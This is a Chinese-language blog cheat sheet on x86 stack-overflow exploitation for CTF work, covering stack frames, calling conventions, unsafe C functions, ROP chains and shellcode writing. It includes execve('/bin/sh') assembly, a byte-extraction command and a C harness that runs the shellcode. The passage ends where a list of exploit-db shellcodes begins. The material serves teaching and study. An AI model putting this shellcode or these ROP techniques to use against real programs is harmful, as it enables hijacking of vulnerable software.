<!DOCTYPE html>
<html lang="en">
<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"srpopty.github.io","root":"/","scheme":"Muse","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="Stack Overflow payloads and attack methods.">
<meta property="og:type" content="article">
<meta property="og:title" content="Stack Overflow CheatSheet">
<meta property="og:url" content="https://srpopty.github.io/2021/08/14/StackOverflow-CheatSheet/index.html">
<meta property="og:site_name" content="Shadow Gallery">
<meta property="og:description" content="Stack Overflow payloads and attack methods.">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://srpopty.github.io/2021/08/14/StackOverflow-CheatSheet/2.png">
<meta property="og:image" content="https://srpopty.github.io/2021/08/14/StackOverflow-CheatSheet/1.png">
<meta property="og:image" content="https://srpopty.github.io/2021/08/14/StackOverflow-CheatSheet/3.png">
<meta property="og:image" content="https://srpopty.github.io/2021/08/14/StackOverflow-CheatSheet/4.png">
<meta property="og:image" content="https://srpopty.github.io/2021/08/14/StackOverflow-CheatSheet/5.png">
<meta property="og:image" content="https://srpopty.github.io/2021/08/14/StackOverflow-CheatSheet/6.png">
<meta property="og:image" content="https://srpopty.github.io/2021/08/14/StackOverflow-CheatSheet/7.png">
<meta property="og:image" content="https://srpopty.github.io/2021/08/14/StackOverflow-CheatSheet/10.png">
<meta property="og:image" content="https://srpopty.github.io/2021/08/14/StackOverflow-CheatSheet/9.png">
<meta property="og:image" content="https://srpopty.github.io/2021/08/14/StackOverflow-CheatSheet/11.png">
<meta property="og:image" content="https://srpopty.github.io/2021/08/14/StackOverflow-CheatSheet/12.png">
<meta property="og:image" content="https://srpopty.github.io/2021/08/14/StackOverflow-CheatSheet/13.png">
<meta property="og:image" content="https://srpopty.github.io/2021/08/14/StackOverflow-CheatSheet/15.png">
<meta property="og:image" content="https://srpopty.github.io/2021/08/14/StackOverflow-CheatSheet/14.png">
<meta property="article:published_time" content="2021-08-14T08:58:55.000Z">
<meta property="article:modified_time" content="2021-08-14T08:58:58.033Z">
<meta property="article:author" content="Srpopty">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="CheatSheet">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://srpopty.github.io/2021/08/14/StackOverflow-CheatSheet/2.png">

<link rel="canonical" href="https://srpopty.github.io/2021/08/14/StackOverflow-CheatSheet/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true
  };
</script>

  <title>Stack Overflow CheatSheet | Shadow Gallery</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="Shadow Gallery" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Shadow Gallery</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
        <p class="site-subtitle">Live in the shadow</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
    <link itemprop="mainEntityOfPage" href="https://srpopty.github.io/2021/08/14/StackOverflow-CheatSheet/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Srpopty">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shadow Gallery">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Stack Overflow CheatSheet
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-08-14 16:58:55 / Modified: 16:58:58" itemprop="dateCreated datePublished" datetime="2021-08-14T16:58:55+08:00">2021-08-14</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Hack/" itemprop="url" rel="index"><span itemprop="name">Hack</span></a>
                </span>
            </span>

          
            <div class="post-description">Stack Overflow payloads and attack methods.</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <blockquote>
<p>本文中的内容均以x86架构为基础</p>
</blockquote>
<h1 id="0x0-寄存器"><a href="#0x0-寄存器" class="headerlink" title="0x0 寄存器"></a>0x0 寄存器</h1><p>32位程序寄存器最大32位（4字节）如eax，64位程序寄存器最大64位（8字节）如rax。寄存器大小示意图如下。</p>
<p><img src="/2021/08/14/StackOverflow-CheatSheet/2.png"></p>
<h1 id="0x1-栈"><a href="#0x1-栈" class="headerlink" title="0x1 栈"></a>0x1 栈</h1><p>栈是一种后入先出（LIFO）的数据结构，在内存空间中由高地址向低地址生长，如下所示。</p>
<p><img src="/2021/08/14/StackOverflow-CheatSheet/1.png"></p>
<h1 id="0x2-函数调用"><a href="#0x2-函数调用" class="headerlink" title="0x2 函数调用"></a>0x2 函数调用</h1><p>程序执行过程中所调用的每一个函数都有属于其自己的栈帧（Stack Frame），栈帧中保存该函数内部使用的各种局部变量。每个函数的栈帧由栈底寄存器ebp和栈顶寄存器esp确定，其中esp可能随着函数内部的执行而变化，ebp一直不变，所以大部分局部变量与函数参数的位置均根据ebp来确定。</p>
<p>在调用一个新函数时需要做三件事</p>
<ul>
<li>传递参数，32位与64位参数传递方式不同：32位程序将参数从右向左压入栈中传递，64位程序前6个参数通过寄存器rdi，rsi，rdx，rcx，r8，r9传递，从第7个参数开始从右向左压入栈中传递</li>
<li>保存返回地址，即调用完新函数以后要执行的下一条指令地址，该操作由call指令完成，即<code>call = (push eip &amp;&amp; eip = ret_addr)</code></li>
<li>进入被调用者的流程，被调用者保存调用者的栈帧，在栈上push当前ebp，之后使esp=ebp，即<code>push ebp &amp;&amp; esp = ebp</code>，最后开辟新栈帧</li>
</ul>
<p>当一个函数执行完成后需要做三件事</p>
<ul>
<li><p>传递返回值到eax中，若返回值大于4字节小于8字节，则高4字节放入eax，低4字节放入edx</p>
</li>
<li><p>恢复调用者的栈帧，恢复原来的esp，使esp=epb，并且pop栈上的old ebp到当前ebp中，该操作由leave指令完成，即<code>(esp = ebp &amp;&amp; pop ebp)</code></p>
</li>
<li><p>跳转到执行完函数的下一条地址，恢复到调用者的执行流程，该操作由ret指令完成，即<code>ret = pop eip</code></p>
</li>
</ul>
<p>常见32位调用约定如下，64位只有一种调用约定，前6个参数通过寄存器rdi，rsi，rdx，rcx，r8，r9传递，从第7个参数开始从右向左入栈</p>
<ul>
<li>cdecl：C函数/C++非成员函数默认的调用约定，参数从右向左入栈，调用者清理栈中参数，eax存放返回值，支持可变参数（例如printf）</li>
<li>stdcall：Pascal或WinAPI常用，参数从右向左入栈，被调用者清理栈中参数，eax存放返回值</li>
<li>fastcall：前两个小于4字节的参数使用ecx和edx传递，其余参数从右向左入栈，被调用者清理栈中参数，eax存放返回值</li>
<li>thiscall：C++非静态的成员函数使用，C++成员函数需要使用this指针，若参数数量固定，则this指针通过ecx传递，其余参数从右向左入栈，被调用者清理栈中参数；若参数数量不固定，所有参数从右向左入栈，最后this指针入栈，调用者清理栈中参数</li>
</ul>
<p>发生函数调用<code>func(1, 2, 3)</code>时，栈变化如下所示（cdecl，32位，64位除了参数传递使用寄存器以外其余均相同），其中ret表示call func指令结束之后下一条指令的地址，即返回地址，old ebp表示调用者栈帧的ebp。</p>
<p><img src="/2021/08/14/StackOverflow-CheatSheet/3.png"></p>
<p>函数func执行完毕后，栈变化如下所示（cdecl，32位），为了便于表示，将leave指令拆分为两条指令。</p>
<p><img src="/2021/08/14/StackOverflow-CheatSheet/4.png"></p>
<h1 id="0x3-栈溢出"><a href="#0x3-栈溢出" class="headerlink" title="0x3 栈溢出"></a>0x3 栈溢出</h1><p>局部变量保存在栈中，当程序接受用户输入并且保存到局部变量中时，若接收到的数据长度大于栈中给局部变量预留的数据长度，则可以发生溢出，修改局部变量之后的数据，包括old ebp以及ret，如果可以修改ret，就可以劫持控制流，当函数执行结束以后就可以跳转到任意指定地址。栈溢出过程如下图所示，假设func函数中有一块16字节大小的局部变量buf，但是接收到了超过16字节大小的数据并且被写入到buf中，假设输入的数据为<code>&#39;A&#39;*(16+4) + &#39;B&#39;*4</code>，可以看到返回地址ret已经被修改为BBBB，将payload中的BBBB修改为其他有可执行权限的地址即可。</p>
<p><img src="/2021/08/14/StackOverflow-CheatSheet/5.png"></p>
<p>可能会造成栈溢出的函数</p>
<ul>
<li><p>read</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从文件fd中读取nbyte个字节写入到buf中</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read</span> <span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> nbyte)</span></span>;</span><br><span class="line"><span class="comment">// fd: 文件描述符，0为从标准输入读取</span></span><br><span class="line"><span class="comment">// buf: 要写入位置的指针</span></span><br><span class="line"><span class="comment">// nbyte: 要读取的字节数</span></span><br><span class="line"><span class="comment">// 返回实际读取到字节数，若返负数表示出现了错误</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>write</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从buf中读取nbytes个字节写入到文件fd中</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> <span class="keyword">void</span> *buf,<span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line"><span class="comment">// fd: 文件描述符，1表示输出到标准输出</span></span><br><span class="line"><span class="comment">// buf: 要读取位置的指针</span></span><br><span class="line"><span class="comment">// nbyte: 要写入的字节数</span></span><br><span class="line"><span class="comment">// 返回实际写入到字节数，若返回负数表示出现了错误</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>gets</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从标准输入缓冲区中读取字符串到str所指的位置中</span></span><br><span class="line"><span class="comment">// gets会从输入缓冲区读取到换行符为止，作为一个字符串，并且删去最后的换行符写入str中</span></span><br><span class="line"><span class="comment">// gets可以读取空格</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">gets</span><span class="params">(<span class="keyword">char</span> *str)</span></span>;</span><br><span class="line"><span class="comment">// str: 要写入位置的指针</span></span><br><span class="line"><span class="comment">// 若读取成功返回写入位置的指针，否则返回空指针</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>scanf</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从标准输入缓冲区中读取符合格式的字符串，遇到空格停止读取</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">scanf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span>;</span><br><span class="line"><span class="comment">// format: 格式化字符串</span></span><br><span class="line"><span class="comment">// ...: 需要被格式化到format的参数</span></span><br><span class="line"><span class="comment">// 若读取成功，返回匹配和赋值的个数，否则返回EOF</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>strcpy/strncopy/memcpy</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从原指针指向的位置读取指定数量字节写入到目标指针的位置</span></span><br><span class="line"><span class="comment">// strcpy/strncpy只支持字符串的复制，memcpy可以复制任何内容</span></span><br><span class="line"><span class="comment">// strcpy函数读取到\0为止，会将\0复制到目标位置，而strncpy不会添加\0，若src的长度小于n字节则用\0填充</span></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">strcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">memcpy</span><span class="params">( <span class="keyword">void</span> *dest, <span class="keyword">const</span> <span class="keyword">void</span> *src, <span class="keyword">size_t</span> count )</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strncpy</span><span class="params">(<span class="keyword">char</span> *dest,<span class="keyword">char</span> *src,<span class="keyword">int</span> <span class="keyword">size_t</span> n)</span></span>;</span><br><span class="line"><span class="comment">// dest: 要写入的位置的指针</span></span><br><span class="line"><span class="comment">// src: 原位置的指针</span></span><br><span class="line"><span class="comment">// count/n: 要写入的字节数</span></span><br><span class="line"><span class="comment">// 若复制成功返回目标位置的指针，否则返回空指针</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>strcat</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将src添加到dest的末尾，删除dest末尾的\0，连同src中的\0一起复制到dest的末尾</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strcat</span><span class="params">(<span class="keyword">char</span> *dest, <span class="keyword">const</span> <span class="keyword">char</span> *src)</span></span>;</span><br><span class="line"><span class="comment">// dest: 目标字符串的指针</span></span><br><span class="line"><span class="comment">// src: 要追加的字符串的指针</span></span><br><span class="line"><span class="comment">// 返回指向dest的指针</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<p>栈溢出寻找方法</p>
<ol>
<li><p>在函数中寻找类似于buf的局部变量</p>
</li>
<li><p>在函数中找到向该buf写入数据的函数</p>
</li>
<li><p>检查可写入的最大大小是否能够超过buf定义大小</p>
</li>
<li><p>若可以溢出，则查看buf在栈中的位置，寻找buf之后是否有其他局部变量，或者是否可以溢出到ret</p>
</li>
<li><p>计算出buf到达目标的总长度，进行溢出，目标可以是ret，buf之后的其他局部变量或者bss段上的某些全局变量</p>
</li>
</ol>
<p>基本套路</p>
<ol>
<li>检查程序的防护措施与运行平台</li>
<li>是静态编译还是动态编译</li>
<li>找到溢出点并且想办法劫持程序流程</li>
<li>静态编译会提供大量的gadgets，需要利用ROP跳转到shellcode或者拼凑出系统调用</li>
<li>动态编译则需要想办法泄漏出一个libc中的地址，最后利用libc中的system执行命令</li>
<li>拿到libc的地址以后找到对应版本的libc（如果题目没有提供libc）</li>
<li>计算出libc的基地址，进而计算出system的地址</li>
<li>跳转到system从而getshell</li>
</ol>
<p>其实栈溢出的目的就是劫持控制流，也就是控制eip寄存器，而eip寄存器又何esp，ebp息息相关，如果可以在ret指令之前控制esp的话，甚至不用覆盖ret也可以劫持控制流，或者如果控制ebp的话甚至可以控制栈低后面的ret。</p>
<h1 id="0x4-ROP"><a href="#0x4-ROP" class="headerlink" title="0x4 ROP"></a>0x4 ROP</h1><p>ROP即Return-Oriented programming（面向返回编程），其最大的作用就是可以绕过多种安全保护措施，并且可以帮助我们Getshell。ROP是指利用程序中碎小的代码片段来操作寄存器，甚至改变程序流程的技术，这些小的代码片段被称为gadgets。一个gadget通常是以ret或者jmp等跳转指令结尾的代码片段，最常用的是以ret结尾，ret指令可以从栈顶弹出一个值到eip中，控制程序下一条指令的地址，如果我们可以控制栈上的元素，就可以利用多个gadgets形成ROP链，不过需要事先得知每个gadget的地址。</p>
<p>通常使用静态编译的程序中会包含大量可用的gadgets，动态编译的程序中也含有少量可以使用的gadgets，收集到足够多的gadgets以后就可以修改寄存器的值并且控制程序的流程。利用多个gadgets修改寄存器以后可以直接调用syscall，也可以直接跳转到写入内存中的shellcode的地址，或者跳转到libc中可以执行系统命令函数的地址。</p>
<p>ROP技术需要有一定汇编指令的基础，并且关键在于如何合理组合各种gadgets形成完美的ROP链。ROP链首先需要从栈溢出修改返回地址开始，最后结束于各种可以getshell的方式。一个简单的ROP示例如下，假设目前已经在程序中找到了一个可用的ROP链，这里以64位为例，并且最终目的是调用execve的系统调用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Gadgets:</span><br><span class="line">    0x400686 : pop rdi ; ret</span><br><span class="line">    0x4101f3 : pop rsi ; ret</span><br><span class="line">    0x4498b5 : pop rdx ; ret</span><br><span class="line">    0x415664 : pop rax ; ret</span><br><span class="line">    0x40129c : syscall</span><br></pre></td></tr></table></figure>



<p>ROP的目的就是在程序中需找大量可以控制寄存器与程序流程的汇编指令，例如各种pop指令，call指令与jmp指令，并且将这些指令通过栈串联起来，此外如果程序中没有合适的指令，也可以通过指令偏移构造合适的指令（不同的机器码解析出的指令也不同）。</p>
<p>栈溢出发生后栈中情况如下图所示，其中addr_of_bin_sh代表字符串<code>/bin/sh</code>的地址。execve的系统调用需要3个参数，第一个参数是需要执行的系统命令的字符串，第二个参数是该命令的参数，第三个参数为该命令的环境变量，通常第一个参数为字符串<code>/bin/sh</code>，第二第三个参数均为0，代表空。</p>
<p><img src="/2021/08/14/StackOverflow-CheatSheet/6.png"></p>
<h1 id="0x5-系统调用"><a href="#0x5-系统调用" class="headerlink" title="0x5 系统调用"></a>0x5 系统调用</h1><p>Getshell的方式之一。系统调用是为了用户空间与系统内核空间进行交互所提供的一组接口，在用户空间运行的程序通过syscall向内核发送请求，内核收到请求后负责执行，请求的参数一般通过寄存器传递，最后通过软中断使程序进入内核态执行对应操作。在32位系统下使用<code>int 0x80</code>指令启动系统调用，64位系统下使用 <code>syscall</code>指令。一般通过ROP构造系统调用，构造系统调用的过程如上节所示。常用的系统调用如下，更多的系统调用参数请参考<code>Syscall CheatSheet</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">char</span> *<span class="keyword">const</span> argv[], <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> nbytes)</span></span>;</span><br></pre></td></tr></table></figure>



<h1 id="0x6-Shellcode"><a href="#0x6-Shellcode" class="headerlink" title="0x6 Shellcode"></a>0x6 Shellcode</h1><p>Getshell的方式之一，主要通过execve系统调用执行命令。shellcode是一组机器码，一般通过直接编写汇编语言后生成机器码，之后通过栈溢出将shellcode写入某个具有可执行权限的地址以后跳转到shellcode的地址即可执行shellcode。</p>
<p>shellcode通常越少越好，另外shellcode中需要避免出现坏字符<code>\x00</code>，坏字符会导致shellcode写入目标地址时发生截断，如果shellcode中需要用到数字0，可以利用其它方式获取，例如<code>xor eax eax</code>即可将eax置0，此外在shellcode中操作立即数时，应该根据立即数的大小尽量选择合适的寄存器，例如<code>mov al, 0x1</code>要比<code>mov rax, 0x1</code>更好，后者会使shellcode变得更长，也可能会使shellcode中出现坏字符。</p>
<p>execve的第一个参数也就是要执行的命令，一般都会是<code>/bin/sh</code>，如果该字符串被保存在栈中时，由于栈是从高地址向低地址生长，因此字符串也应该反向写入栈中，另外为了内存对齐，字符串的长度需要为机器字长的倍数，所以采用<code>//bin/sh</code>。若出于某种原因，shellcode中无法使用栈（不能利用pop与push指令），可以先利用write或者read系统调用将字符串<code>/bin/sh</code>写入某个内存中的地方。若在shellcode执行的上下文环境中没有合适的地址，可以先执行一次read系统调用，部分系统调用结束以后会改变某些寄存器的值为某个地址。</p>
<p>编写shellcode的方法如下。</p>
<ol>
<li><p>编写对应的汇编代码（以32位机器为例）</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Section .text</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ; eax&#x3D;11 ebx&#x3D;&quot;&#x2F;&#x2F;bin&#x2F;sh&quot; ecx&#x3D;[&quot;&#x2F;&#x2F;bin&#x2F;sh&quot;, NULL] edx&#x3D;NULL</span><br><span class="line"></span><br><span class="line">    xor eax, eax  ; Get zero</span><br><span class="line"></span><br><span class="line">    ; The first arg</span><br><span class="line">    push eax  ; The string ending \x00</span><br><span class="line">    push 0x68732f6e</span><br><span class="line">    push 0x69622f2f  ; &quot;&#x2F;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">    mov ebx, esp  ; ebx&#x3D;&quot;&#x2F;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line"></span><br><span class="line">    ; NULL at argv[1]</span><br><span class="line">    push eax </span><br><span class="line">    mov edx, esp  ; edx&#x3D;NULL</span><br><span class="line"></span><br><span class="line">    ; Address of &quot;&#x2F;&#x2F;bin&#x2F;sh&quot; at argv[0]</span><br><span class="line">    push ebx</span><br><span class="line">    mov ecx, esp  ;ecx&#x3D;[&quot;&#x2F;&#x2F;bin&#x2F;sh&quot;, NULL]</span><br><span class="line"></span><br><span class="line">    ; Call execve</span><br><span class="line">    mov al, 11</span><br><span class="line">    int 0x80</span><br></pre></td></tr></table></figure>
</li>
<li><p>汇编</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf32 shell.asm</span><br></pre></td></tr></table></figure>
</li>
<li><p>提取shellcode并检查是否出现<code>\x00</code></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ./shell |grep <span class="string">&#x27;[0-9a-f]:&#x27;</span>|grep -v <span class="string">&#x27;file&#x27;</span>|cut -f2 -d:|cut -f1-6 -d<span class="string">&#x27; &#x27;</span>|tr -s <span class="string">&#x27; &#x27;</span>|tr <span class="string">&#x27;\t&#x27;</span> <span class="string">&#x27; &#x27;</span>|sed <span class="string">&#x27;s/ $//g&#x27;</span>|sed <span class="string">&#x27;s/ /\\x/g&#x27;</span>|paste -d <span class="string">&#x27;&#x27;</span> -s |sed <span class="string">&#x27;s/^/&quot;/&#x27;</span>|sed <span class="string">&#x27;s/$/&quot;/g&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>优化shellcode</p>
</li>
<li><p>测试shellcode</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -fno-stack-protector -z norelro -no-pie -z execstack shellcode.c -o shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">&quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> (*func)();</span><br><span class="line">    func = (<span class="keyword">int</span> (*)()) shellcode;</span><br><span class="line">    (<span class="keyword">int</span>)(*func)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



</li>
</ol>
<p>这里提供了一些可用的shellcode（来自<a href="www.exploit-db.com">exploit-db</a>）</p>
<ol>
<li><p>前文shellcode（x86，25 bytes）</p>
